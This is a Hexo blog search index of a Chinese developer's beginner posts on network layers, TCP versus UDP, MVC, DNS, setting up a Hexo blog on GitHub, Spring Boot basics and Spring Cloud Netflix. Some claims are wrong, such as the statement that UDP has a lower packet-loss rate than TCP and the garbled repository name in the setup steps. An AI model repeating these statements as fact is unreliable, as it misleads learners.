    <content type="text"><![CDATA[Five layer network protoco 五层网络协议 三种模型 （包含五层网络协议）OSI七层体系结构 应用层 ： 报文表示层 ： 确保一个系统的应用层所发送的信息可以被另一个系统的应用层读取会话层 ： 从网络到具体的本地设备之间联系运输层 ： 数据协议等基本信息网络层 ： 网络系统中主机之间的数据的传输和路径的选择数据链路层 ： 规范数据的传输到物理设备物理层 ： 最底层，就是我们所见到的网络接口光纤等 TCP/IP四层体系结构 应用层运输层网际层网络接口层 五层网络结构 应用层 ： 顾名思义，向用户提供最直接的网络服务，如HTTP，SMTP， FTP等运输层 ： TCP，UDP两种协议传输数据网络层 ： 1.）把运输层中的报文段封装成包进行传输 2.）选测路由，通过路由找到合适的主机数据链路层 ： 规范数据传输到物理设备物理层 ： 最底层，网络接口光纤等 三种模型的联系和关系这里提及一点所谓的五层网络协议其实并不是特别准确的描述，只是OSI和TCP/IP体系结构的综合表述 具体关系如下 ： TCP 和 UDP 补充如上介绍，TCP和UDP是存在于运输层的两种传输协议，而报文段的传送也主要是以来于这两种协议，那么二者的区别呢 (1) 传输控制协议TCP(Transmission Control Protocol)：面向连接的，数据传输的单位是报文段，能够提供可靠的交付。(2) 用户数据包协议UDP(User Datagram Protocol)：无连接的，数据传输的单位是用户数据报，不保证提供可靠的交付，只能提供“尽最大努力交付”。 二者的比较 由于TCP一定需要连接，所以TCP与UDP相比也更加的安全TCP的连接保证安全的代价也是更大的，也导致了TCP的传输效率低的问题，相比起来的话，UDP则具备速度快，连接简单，消耗资源低的优点UDP的丢包率更低总而言之TCP与UDP的根本却别在于是否需要连接]]></content>
  </entry>
  <entry>
    <title><![CDATA[springboor2.0新特性记录]]></title>
    <url>%2F2019%2F03%2F23%2Fspringboot%E6%96%B0%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[EmbeddedServletContainerCustomizer EmbeddedServletContainerCustomizer =&gt; WebServerFactoryCustomizer ;]]></content>
  </entry>
  <entry>
    <title><![CDATA[MVC续谈]]></title>
    <url>%2F2019%2F03%2F23%2FMVC%2F</url>
    <content type="text"><![CDATA[mvc，mvp，mvvm理解 mvc作为经典的开发模式，能经久不衰当然是有独到的过人之处的，简单容易理解model，controller，view三大部分，相互独立，但是也相互关联使得开发变得条理性极强，同时由于独立性使得可维护性很高简单的说一下网页的布局，view就是前端的那些东西，html，css顺一个js，model和数据库以及所需要的对象模型 mvc，mvp，mvvm理解 mvc作为经典的开发模式，能经久不衰当然是有独到的过人之处的，简单容易理解model，controller，view三大部分，相互独立，但是也相互关联，使得开发变得条理性极强，同时由于独立性使得可维护性很高，简单的说一下网页的布局，view就是前端的那些东西，html，css顺一个js，model和数据库以及所需要的对象模型，在然后就是servlet作为controller了，交互有两种方式，v-&gt;c-&gt;m，v-&gt;m-&gt;c，这样子完成对数据的处理，也就是所谓的后端流程，在javaee中的建包方法就很好的体现了这点，分别是，dao包，service包，和servlet包（实际上还有一个dbutil是用来折腾jdbc的，不赘述了）dao就是model，service和servlet就是controller了，service是服务层，就是一个调用接口的过程，servlet就是真正的controller了，其实这些包下面还有impl子包，这样子的话实现与声明分离，可维护行也提高。再继续举例子，就是Python的flask框架了，他的分离更加简单，static静态资源库，home//admin，前台和后台的分离，init初始化，run开始。也是完全走着mvc的风格。总而言之mvc就是让模块分离的一种设计思想 ##mvvm和mvp,这两个直接看图吧。没啥好讲的了。。 说一下缺点，看了一下那篇英文的和那个中文的mvc已死的博客，其实双方都是担忧一个controller臃肿的问题，没错，如果太多的处理量都传递给controller那么势必变得繁杂，更可怕是提高耦合度，所以他们想利用一个content模块来分担controllet的压力，更多的数据处理放在content，更多的逻辑处理放在controller，尽管没有成型，但是博主们都给出了类似这样子的思路。不过话讲回来，mvc始终是经典，现在仍然是主流，学习的时候用mvc的思路去分析，还是十分必要的。]]></content>
  </entry>
  <entry>
    <title><![CDATA[从url到网页到底发生了什么]]></title>
    <url>%2F2019%2F03%2F23%2FFromUrlToPage%2F</url>
    <content type="text"><![CDATA[url是什么 URL其实就是我们常说的网址，作用也是顾名思义就是定位效果，而术语则是资源定位符，也是互联网上标准资源的地址，这个点到为止不再赘述。 DNS解析什么是DNS解析 然后下一步我们需要dns解析，什么dns解析呢，就是把url翻译成机器可识别的数字格式，类似我们所熟悉的192.168.1这样子，这样子才是可以被解析的。 DNS解析过程 这个过程也是在专门的解析服务器上自动解析的，dns解析会有四个步骤， 第一个则是查找浏览器缓存（不同浏览器不同一般是两到三十分钟左右）第二个则是在本地系统查找缓存（本地也会有缓存，比如tomcat的localhost：8080）第三个是在路由器查找缓存（没错，部分路由器是具有缓存功能的）第四个则是ISP查找（这个比较厉害，直接查向运营商最高服务器）。之后就是通过tcp链接服务器了，服务器这时才会开始处理请求，向我们的浏览器传递数据，一些需要注意的地方 值得注意的是浏览器是边传输边渲染的，当然没有遇到js之前，js是单线程，而且js可以对html网页进行更改，大家所看到的很好的特效，都是js在进行这时我们的页面就加载完成啦。至于通信协议也是很简单，就是传递给服务器的协议，当然服务器向浏览器传输也要遵循http你要通过才能传递，这是一种规范也是一种手段。还有就是渲染过程也是可以了解一下的，渲染以树的方法渲染着呢，dom树，解析css和js交互。再细化就是前台和后端了，后端可以直接用servlet来传递协议（虽然springmvc里面是dispatcherservlet，或者说是controller，但是实质还是servlet，接口几乎全适用）但是这样子传输还是存在问题，这样前后端交互总这样，数据更新不同步，所以ajax就出现了，实现机理也简单,就是在传递给servlet之前，需要多传递一个ajax。如此就可以不必要必须走服务器，走异步交互啦，技术方面就是jquery。]]></content>
  </entry>
  <entry>
    <title><![CDATA[单例设计模式，MVC，监听者模式]]></title>
    <url>%2F2019%2F03%2F23%2Fdesignpattern%2F</url>
    <content type="text"><![CDATA[目前的了解三种设计模式单例设计模式单例模式其实显而易见，就是突出一个单字，一切运行过程核心集中于一个类，采用该模式开发，也是要求一个类只有一个对象，或者说只有一个实例。 监听者模式，怎么讲呢？监听者模式其实更像是按照树的思路创建出的一种设计模式，简单的说起来就是子类被父类监听，逐级向上传递，期中需要三个对象，事件，事件源，事件监听器。相对应的还有一个观察者模式，emm，个人理解哈，讲真，观察者模式就是监听者模式简化。 大名鼎鼎的MVC 大名鼎鼎的开发模式了，spring为了web还专门引出分支springmvc，可见一斑了，m是model，v是view，c是controller。用springmvc作为典例说一下哈，m就是模型对象，是一种概念吧，传参，用的mode，modeandview应该都不陌生，还有就是bean的配置都是model的东西，在这里可以理解成封装好的project的应用模型，view，就是给用户看到的东西呗，js，html，css这些前端的东西嘛。controller，这个是核心了，也就是真正的后端完善逻辑部分的核心控制器了，springmvc中直接明确给controller极高的地位置，dispatchercontroller，这个可不虚名，model传来的的参数，view的视图，在中央核心控制器中都可以实现，所以听名字就可以看出来重要性了，最后总结一下，其实mvc就是把图和逻辑分开，逻辑把参数和真实逻辑又分开的一种开发模式，这样导致程序的可维护性增加，逻辑出错找逻辑，参数出错找model，视图修改找view]]></content>
  </entry>
  <entry>
    <title><![CDATA[hexo + github 博客搭建教程]]></title>
    <url>%2F2019%2F03%2F23%2FMy%20first%20blog%2F</url>
    <content type="text"><![CDATA[搭建博客的一些基本常识我们搭建博客还是需要一点基本的知识的，不会让大家盲目的只是照着教程去看这些东西，更多的希望 大家可以从中明白一些网站什么的基本原理 1.） github一个网站能否被外网所访问，最关键的是需要一个平台或者说是一个服务器去使用，所以一部分 会直接自己写博客放在自己的服务器上（小声：本文不是这样的），但是服务器是需要买的，成本太大 我们不使用这种方法，但是github也可以当作一个服务器来看待，我们就可以托管到github上使得我们 的博客可以访问。 2.） git博客的搭建，不仅仅是一个被访问的过程，你还需要用自己的电脑去不断的操作你线上的博客，那么 git这个工具就是一个必不可少的东西了，这个可以直接与你的github操作，完成你博客的更新。但是本地 和线上博客交互，你起码要让github知道，你的本地是安全的，可以被访问才行，所以ssh密匙就是做这个 工作的，只有ssh密匙认证，这个样子我们的才能放心我们博客的安全 3.） 关于主题博客嘛，毕竟是自己的，我们所需要的当然不仅仅是被访问，关键是得自己喜欢，所以有了主题选择 的这个部分 1. github部分github注册 （如果已经有账号的可以忽略一下）github 首先进入官网，记得去注册一个github账号，没有注册过的第一个页面就是github的注册页面 2. 创建一个仓库 注册完毕以后就是去new 一个repository 一定要按照我的要求去写，尤其是那个用户名，比如我的用户名是Runindark，所以是Runindark.github.in 你们需要的就是用你们自己的用户名替换我的Runindark就好了 这个也选好把，没什么坏处 之后就可以看到大致这样的界面了，我的是已经搭建好的所以和大家刚刚弄好的不太一样，但是大致界面没问题 3. 下载gitgithub 下载好以后，安装，全程默认设置一直点就OK了这个超级简单。 4. 下载node.jsnode.js 大家需要下载这个，毕竟有很多东西都是这里的，老老实实安装吧 5. 下载hexo然后大家需要在自己的电脑上找一个地方去创建一个文件夹，用来存放你自己博客的内容的地方，而且博客的初始化文件也很重要 创建好以后右击文件夹 git bash 就会进入了，名字不重要，大家自己随便起就欧克了 开始执行命令了，后面的环节大家划重点，不要关闭你的gitbash的终端窗口，一定不要 /********安装hexo指令********/ npm install -g hexo-cli /*******hexo初始化指令*******/ hexo init /*******hexo安装组件*********/ npm install /******静态网页更新指令*******/ hexo g /******静态网页启动服务*******/ hexo s 这样子一套下来，应该会出现 浏览器输入网址： http://localhost:4000/ 大家应该会出现 hexo 的那个基本的页面，如果没有出现网页，那么就需要自己考虑一下是不是哪一步有问题了 如果正常的话，这个样子你的博客就完成一大半了，先恭喜一下。 6. ssh密匙这部分的作用我在开头已经给大家讲过了，大家严格按照我的步骤，做下去就没问题使得github和你的hexo联系起来 git config --global user.name &quot;Runindark&quot; git config --global user.email &quot;1414776384@qq.com&quot; //提示一下，Runindark是要替换成你的github名字的 //提示两下，1414776384@qq.com 是需要替换成你注册github时的邮箱的 ssh-keygen -t rsa -C “1414776384@qq.com” //这边也是，邮箱要换成你注册github的邮箱 eval &quot;$(ssh-agent -s)&quot; ssh-add ~/.ssh/id_rsa 输入完这两条指令就欧克了，然后需要找ssh文件了 目录就是你的c盘用户名下面，我的如下 再之后就是用记事本打开我标注的哪个文件，所谓的ssh密匙就是这个了 复制，粘贴全部（ps一下哈，这个东西打开末尾是你的邮箱，如果不是，那就是出错了） 重新打开你的github 打开之后，创建新的ssh 如图，简单操作一下 别急·冷静·还有最后一步马上完事了 下载sublime 超级好的工具sublime 下载好以后，打开，把之前创建的初始化hexo的文件夹都拖进来，如图 找到config配置文件 然后更改如图的内容 说一下哪个repository，这个地方是在github上的，如图，大家要复制那里的东西 最后屏住呼吸 输入如下指令 hexo d -g 然后大功告成 输入 Runindark.github.io.git （Runindark换成你的用户名） 就可以访问外网了。 博客搭建到这里就结束了，后面两部分，下次给大家更新 7. 选择主题8. 域名绑定]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot-05-配置文件]]></title>
    <url>%2F2019%2F03%2F23%2FSpringBoot-05-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[springboot中含有大量的配置文件，但是究竟有哪些属性被配置，或者需要配置，作为开发者都应该有个大致的了解 配置文件的几种类型xml 学习spring的第一个配置文件就是xml文件了，在我们的maven工程中pom.xml大家应该都不陌生了语法直接看看百度就好，也没什么要说的，有点类似html，写起来个人觉得繁琐了一些 properties 在我们的springboot中的/config/application.properties就是这个类型的文件，语法特别的简单易懂 yaml 如果利用markdown的小伙伴使用这个的话一定不陌生了，利用space来进行区域的划分，速度快，唯独语法上要求key：必须带有空格个人更新博客的时候有被类似的要求坑害过，但是不能直接给yaml差评 json springboot中默认的文件传输，速度快，短小精悍。 个人总结这些语言其实只是一个工具，每种语言的诞生都是有自己的含义的，只要用的习惯就好，博主比较懒，一般就是application.properties中直接更改了，或者也用用yaml，这个不重要，大家自我定夺 。 springboot中默认的属性官方默认属性查看 如果需要修改，直接复制对应的配置文件，加到application.properties里面]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot-04-热部署]]></title>
    <url>%2F2019%2F03%2F23%2FSpringBoot-04-%E7%83%AD%E9%83%A8%E7%BD%B2%2F</url>
    <content type="text"><![CDATA[对于我们的开发来说，如果每一次更新文件或者源码，都需要去重启服务的话，对我们的开发和执行效率来说实在是太慢了。springboot由于自身整合了tomcat所以速度更快一些，如果是学习过springmvc的话，每次都去重启tomcat服务器是特别慢的，热部署也就应运而生了。 热部署热部署官网 依赖代码 org.springframework.boot spring-boot-devtools true 热部署基本操作 更改源码后直接 ctrl+s 执行保存操作更新 在application.properties中更改一些路径不被热部署 spring.devtools.restart.exclude= (文件路径) 如果你不想每次执行保存操作后就进行热部署，那么可以用 “trigger.txt” 文件修改 在application.properties中添加如下代码spring.devtools.restart.trigger-file=trigger.txt创建 “trigger.txt” 文件这样你只有在保存trigger.txt文件的时候进行热部署 注意事项： 在springboot中热部署你修改的java源码中的内容，但是静态目录的内容是不会被加载的 热部署的实质是监听，他会捕捉 你 ctrl + s的操作，也就是文件保存的操作，将触发热部署 热部署是主动进行的，如果你的保存操作被执行，那么你将会看到日志信息的更新 为什么提早讲述热部署我觉得热部署其实是很简单的一种骚操作，没有什么太高大上的东西，但是具有足够的基础和底层理论的积累，可以看看jvm的classloader的部分（惭愧：目前自己没看过）而且提早进行热部署可以提早的进行熟悉，对后面的整合会更加自如]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F03%2F23%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot-03-目录结构再谈]]></title>
    <url>%2F2019%2F03%2F23%2FSpringBoot-03-%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E5%86%8D%E8%B0%88%2F</url>
    <content type="text"><![CDATA[重读目录结构使用一个框架，也同时意味着去遵守一个框架的标准，包括目录的结构，目录名，虽然之前我简单的有提过我们的目录结构，但是只是很粗浅的说，其实目录结构大多数的博主是不会提及的，自己也踩过雷，也当是在这个方面有过很多的纠结，所以觉得有必要重新拿起目录结构深究一下。 目录结构 src/main/java：存放代码src/main/resourcesstatic: 存放静态文件，比如 css、js、image,templates:存放静态页面jsp,html,tplconfig:存放配置文件,application.propertiesresources: 可以看到这就是我们的完整的目录信息，至于至于源码区域我们不用多说，以后会常常用到，所以不是这次说的重点。对于config，我有说过springboot其实封装好了大多数的东西，但是有些默认的参数是我们不需要的，那么调节或者说更改参数就是在config下的文件进行修改，距离写出的application.properties只是系统自动生成的文件之一，今后我们还会使用到yaml和xml，当然yaml会更加的方便我们的书写，也更加的快速 静态资源目录我们可以看到可以存放资源的目录有很多，这些目录的名字都是系统中默认写好的名字，我们不要去做任何的修改，springboot在启动的时候会自动的从我们的文件目录下去寻找自己锁需要的文件，如果随意的更改我们的文件名字，就会导致无法获取我们所需要的静态资源从而导致404这类错误，当然springboot查询目录也是有自己的优先级的，下面就是优先级的排布 META/resources &gt; resources &gt; static &gt; public 有些东西需要注意一下，在springboot中，其实高优先级与低优先级之间不是覆盖的关系，而是互补的，举个例子来说如果你在高优先级更改端口号，那么低优先级再更改端口号是没有意义的但是如果你在低优先级中书写了其他的内容，那么依然生效 默认配置官网地址 spring.resources.static-locations =classpath:/META-INF/resources/,classpath:/resources/,classpath:/static/,classpath:/public/]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot-02-控制器和注解]]></title>
    <url>%2F2019%2F03%2F23%2FSpringBoot-02-%E6%8E%A7%E5%88%B6%E5%99%A8%E5%92%8C%E6%B3%A8%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[说在前面的话对于一个后端来说，其实很简单的，说的明白一些就是接受和处理前端的数据，同时也要发送整理好的数据给前端网页，但是，在springboot，如何进行前后端数据的交互，就是要涉及到springboot了 。 中央核心控制器 DispatcherServlet上面提到的，前后端数据的交互的核心就是我们controller了，在springmvc中，这个东西可是最为关键和核心的内容,如下是dispatcherServlet在springmvc中的注册信息，（这里带大家看一下，毕竟这是springmvc中的东西，在我们的springboot中是看不到的） springMVC org.springframework.web.servlet.DispatcherServlet contextConfigLocation classpath:springmvc.xml 1 说到底，我们的controller的实质还是一个servlet，在javaEE中，我们的使用常用的HTTPServlet，因此HTTPServletRequest，HTTPServletResponse放在controller中是完全适用的。 我们后端的绝大多数操作也将会放在controller中进行，所以务必注意，包括之后的皆接口的名字，导包信息，都要谨慎 。 第一个controller 大家可以先观察一下我们的controller的类是放在什么位置的，然后我加上源码分析一下 。 package com.yuliao.wordsmemory; import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController; //controller注解@RestControllerpublic class Words { //映射注解 @RequestMapping(“/printWords”) public String printWords (){ //输出到前台的数据 return &quot;HelloWorld&quot; ; } } @RestController 其实RestController是两个注解的合体，我们之所以可以在controller使用return语句返回 “HelloWorld” 到前台其实是一个叫@ResponseBody的注解在起作用分析底层底层源码是可以看到的，所以在这里我们可以写一个等式 @RestController = @Controller + @ResponseBody @RequestMapping RequestMapping就是我们所说的映射，这个就是在网页静态地址规范controller作用范围，就如刚刚我们的代码所写的，我们启动服务器以后我们需要在浏览器中查找 数据的传输在我们的springboot中默认的数据传输类型是json格式的，当我们创建一个类的时候，利用 return 返回到前台的时候，会自动变成json的数据类型，javabean自动序列化成json数据类型是有 jackson&gt;fastjson&gt;gson&gt;json-lib ，我们使用的是jackso，所以一些我们的常用的注解有以下集中指定字段不返回： @JsonIgnore指定日期格式： @JsonFormat()指定别名： @JsonProperty 一些要说的东西这里的注解只是很简单的给大家介绍一下如何向前台传递数据，至于如何从前台获取数据稍后也会更新，对于注解这是我们最常用的几个，但是这些数量对于我们来说是远远不够的，包括去掉@ResponseBody传递数据将会有什么用，这些都暂时没有提及。]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot-01-项目建立]]></title>
    <url>%2F2019%2F03%2F23%2FSpringBoot-01-%E9%A1%B9%E7%9B%AE%E5%BB%BA%E7%AB%8B%2F</url>
    <content type="text"><![CDATA[说在前面的话一头扎入框架的我也慢慢的开始接触springboot的旷阔领域中，之前学习了太多的理论知识，实践能力着实不堪，立下flag以求自己能坚持下去，同时开始稳定更新博客，从头到尾的去把springboot的教程出一份，作为自己的笔记也作为经验之谈，写的不好的地方大家多多指出，谢谢。 学习springboot你需要什么知识储备 不要轻举妄动，框架的学习要一步一步的走，直接跨越，直接上手springboot，你也许觉得照猫画虎，框架的使用很简单，但是只有表面功夫是远远不够的，沉住气，你需要学习 javaEE , springmvc至于持久层mybatis可以暂时跳过，spring一些属性注入方式也可以暂时不看，但是前两者的一定要看。至于要看的课程的话 推荐一个老师，淘宝买课认识的，大家可以去看下 monkey1024要资源的话不要找我，尊重一个老师的劳动成果，几十的东西，大家买一下，支持一个 ##开发工具(IDE) 我推荐哈，idea很舒服，简单明了，之前有用过pycharm和clion的都可以直接上手的，毕竟一个公司设计的东西，eclipse怎么说呢，很好的ide，但是容易抽风，如果身边有常用eclipse的人，他们口头都会挂上一句“重启大法好”，所以入门直接使用idea就很好了，我的教程也全是基于idea的，下载过程省略，IDEA 项目创建项目的教程全部如图咯~ 目录分析如图我们来看一下我们的初始化目录，该写什么，能写在哪里，之间的调用方式和执行流程都和目录关系密切（只列举我们要用到的，或者说常用的，其他的有些我也其实不清楚，有的直接删除也不影响） src:这个就是我们的源码区域 java: 要写的controller，DAO ， impl等 resource: 顾名思义就是我们的一些资源文件，其下的static就是我们所说的静态资源，包括css,html,js,image等等 templates： 也是顾名思义就是模板，也是我们的一些模板引擎，例如 JSP、Velocity、Freemarker、Thymeleaf我后期会更新的也是thymeleaf，当然也是springboot官方推荐的 test: 有点类似junit服务，就是一个测试的地方，springboot直接将这个整合进来，很方便 pom.xml 这个其实没什么好说的，就是maven资源管理的文件，所有的依赖就是写在这里的 讲完了，一些后话这个教程不是完全针对0基础的初学者的，正如我说的，你需要足够的知识储备才建议去学习springboot，当然了也有一些名词是大家没有听说过的但是，稍安勿躁，大家目前需要大致的了解，对于一些特定的内容比如模板引擎，日志驱动sel4j等一系列内容都会出教程。]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud-Netflix-01-微服务简介]]></title>
    <url>%2F2019%2F03%2F23%2FSpringCloud-Netflix-01-%E7%AE%80%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[说在前面的话经历了springboot的单体地狱之后。直接进军springcloud系列，开始着手接触微服务这个新世界，很好，javaweb仍然在颠覆我之前的学习。 微服务目前微服务的三套方案 springcloud-netflix ：影响力极大的一个微服务解决方案 springcloud-alibaba ： 阿里巴巴公司的一套微服务生态 dubbo + zoomkeeper ： 效果奇佳的决绝方案，但是确实部分机制，需要第三方 简介谈起微服务，不得不说起分布式架构的东西，从开始接触微服务，其实才真正的迈入高性能开发的世界，不得不说，如果springboot是自动装配的完美题，那么微服务架构才是真正面向当今大型网络的开发方式，代码的管理不再是面向模块的编程而是面向项目编程，更加准确的说是面向服务编程。 顾名思义微服无就是，更小的服务，和物理所学的微元法相似，把一个大型的互联网项目拆分成一个个小读注册项目，这样实现大型的功能需求，而且通过高并发，高可用的机制，同时伴随gitlab的使用，成为一个真正的云端开发项目 微服务和分布式解决的问题我们总是说微服务，谈论分布式，可是说到及微服务和分布式到底解决了什么问题呢。 分布式解决的问题分布式架构的提出，解决了单体应用低聚合，高耦合的问题，单体应用会导致单一的项目代码过度繁杂，耦合度高，而且无法实现高并发，高可用的效果，所以分布式架构的提出，就是为了击破传统的构建项目方式。 微服务解决的问题 服务的通信 对应用服务的拆分 服务应用的部署访问 服务的熔断处理 springcloud微服务构建依赖统一管理对于springboot项目，我们常常使用maven作为管理工具，在单体应用中，maven管理jar包依赖，为我们节省了很多的事情，但是，面对微服务，我们面对将会是是大量的项目，成百上千，如果反复一个项目一个项目的配置依赖环境，那么势必会造成很多的冗余依赖，所以提取出共享的依赖统一集中管理，这样才能有更高的效率和更好的管理方式。 服务注册与发现微服务拆分了太多的小项目，但是是多个服务集中去处理一套事务，因此我们需要存在某种中间件去管理所有的微服务项目，这就是服务注册与发现。用此来保证我们的服务管理和集成。Netflix中则是EurekaServer。 服务提供者既然存在了服务的管理机制，那么我们就开始向我们的事务，提供服务了，这里有EurekaClient来作为服务的提供者 服务消费者既然有服务提供者，必然存在服务的消费者，用大量的消费者来完成我们的事务的需求。Ribbon，Feign。 服务熔断还是回到微服务问题，大量服务的出现，我们不可能保证每一个服务都是可以正常的，不会发生宕机的，因此我们需要对宕机的程序进行管理，自动终止，我们称之为熔断机制。Hystrix 服务追踪服务追踪，其实简单的说就是服务的监控，对于每一个服务的流量等问题进行集中的监控 ，致力于收集服务的定时数据，以解决微服务架构中的延迟问题，包括数据的收集、存储、查找和展现。ZipKin #### 使用路由网关实现统一访问接口每一个微服务都有相对应的端口，每一次的配置我们如果一一对应那么势必变得极其繁琐，我们希望用一个统一的路由网关去管理不同的微服务，如此才能更加简化配置信息，而配置信息则存储在ｇitlab上，这样方便多人开发去使用不同的项目配置。 SpringCloud-Netflix目前的情况2018年12月12日，Netflix宣布Spring Cloud Netflix 系列技术栈进入维护模式（不再添加新特性）最近，Netflix 宣布 Hystrix 正在进入维护模式。自 2016 年以来，Ribbon 已处于类似状态。虽然 Hystrix 和 Ribbon 现已处于维护模式，但它们仍然在 Netflix 大规模部署。Hystrix Dashboard 和 Turbine 已被 Atlas 取代。这些项目的最后一次提交分别是 2 年前和 4 年前。Zuul1 和 Archaius1 都被后来不兼容的版本所取代。 简介Spring Cloud 为开发人员提供了快速构建分布式系统中一些常见模式的工具（例如配置管理，服务发现，断路器，智能路由，微代理，控制总线）。分布式系统的协调导致了样板模式, 使用 Spring Cloud 开发人员可以快速地支持实现这些模式的服务和应用程序。他们将在任何分布式环境中运行良好，包括开发人员自己的笔记本电脑，裸机数据中心，以及 Cloud Foundry 等托管平台。]]></content>
  </entry>
  <entry>
    <title><![CDATA[源码阅读分享]]></title>
    <url>%2F2019%2F03%2F23%2FSourceRead%2F</url>
    <content type="text"><![CDATA[说在前面的话从学习java web开始到现在，也算是一个老油条了，但是学完之后确实存在一些失落，更多读觉得自己只是在照猫画虎，没有深层的东西，这里开始分享一些源码读阅读或者文章给大家呈现]]></content>
  </entry>
</search>
